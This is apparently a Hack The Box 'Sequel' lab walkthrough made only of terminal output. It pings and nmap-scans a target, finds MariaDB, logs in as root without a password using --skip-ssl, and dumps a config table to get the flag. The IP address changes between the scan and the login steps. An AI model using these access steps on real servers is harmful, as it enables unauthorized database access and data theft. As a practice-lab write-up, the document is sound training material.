# Sequel

```
┌──(kali㉿kali)-[~/Downloads]
└─$ ping 10.129.95.38 
PING 10.129.95.38 (10.129.95.38) 56(84) bytes of data.
64 bytes from 10.129.95.38: icmp_seq=1 ttl=63 time=384 ms
64 bytes from 10.129.95.38: icmp_seq=2 ttl=63 time=28.2 ms
^C
--- 10.129.95.38 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1006ms
rtt min/avg/max/mdev = 28.184/205.950/383.717/177.766 ms
```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo nmap -sC 10.129.95.38 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-08 11:50 EDT
Stats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 93.60% done; ETC: 11:50 (0:00:01 remaining)
Nmap scan report for 10.129.95.38
Host is up (0.031s latency).
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 36
|   Capabilities flags: 63486
|   Some Capabilities: ODBCClient, Support41Auth, FoundRows, DontAllowDatabaseTableColumn, SupportsLoadDataLocal, InteractiveClient, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolOld, SupportsTransactions, IgnoreSigpipes, LongColumnFlag, SupportsCompression, ConnectWithDatabase, Speaks41ProtocolNew, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: uA%2i=66L\gp!OLnd+Im
|_  Auth Plugin Name: mysql_native_password

Nmap done: 1 IP address (1 host up) scanned in 43.21 seconds
```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ mysql -u root -h 10.129.95.232
ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it
```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ mysql -u root -h 10.129.95.232 --skip-ssl
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 37
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Support MariaDB developers by giving a star at https://github.com/MariaDB/server
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.027 sec)

MariaDB [(none)]> USE htb
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [htb]> SHOW tables;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.028 sec)

MariaDB [htb]> SELECT * FROM config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0.028 sec)
```







